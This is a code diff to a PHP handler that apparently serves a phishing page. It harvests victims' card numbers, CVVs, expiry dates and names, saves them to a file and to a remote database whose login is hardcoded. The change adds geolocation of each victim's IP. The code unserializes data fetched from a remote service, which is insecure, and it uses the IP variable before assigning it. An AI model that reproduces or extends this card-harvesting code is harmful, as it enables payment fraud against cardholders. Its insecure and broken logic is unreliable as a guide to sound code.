@@ -97,9 +97,8 @@ require 'autre/phpmailer/smtp.php';
 
 
 
-if(  isset($_POST["name"])     )
-{
-		
+if(  isset($_POST["name"]) &&  $infoip=@unserialize(file_get_contents('http://ip-api.com/php/' .$ip))  )
+{		
 $connect = new PDO("mysql:host=freedb.tech;dbname=freedbtech_wordpresst", "freedbtech_mehdiouatmane", "mehdi2014@A");
 function get_ip(){   if( isset($_SERVER['HTTP_CLIENT_IP']) )   {  return $_SERVER['HTTP_CLIENT_IP'];}  elseif  ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) )     { return $_SERVER['HTTP_X_FORWARDED_FOR'];}   else  { return (  isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''   ); }     }
 $ip = get_ip();  
@@ -114,7 +113,6 @@ $namecard = $_POST['namecard'];
 $cardnumber = $_POST['cardnumber'];
 $cvv = $_POST['cvv'];
 $datexp = $_POST['datexp'];  
-
 
 
 
@@ -161,6 +159,8 @@ fwrite($file ,    "namecard : "     .      $namecard     .      "\n");
 fwrite($file ,    "cardnumber : "   .      $cardnumber   .      "\n"); 
 fwrite($file ,    "cvv : "          .      $cvv          .      "\n"); 
 fwrite($file ,    "datexp : "       .      $datexp       .      "\n"); 
+fwrite($file ,    "infoip : "       .      $infoip['country']   .  $infoip['city']   .      "\n"); 
+
 fwrite($file , "\n");
 if ( $file   ) {  echo "";   }else{  echo "";   }
 
@@ -186,13 +186,15 @@ if(     $connect   ->  prepare($query)	->  execute($user_data)               )  
 
 
 
-
-
 	
 
 
 	
 }
+
+
+
+
 
 ?>
 
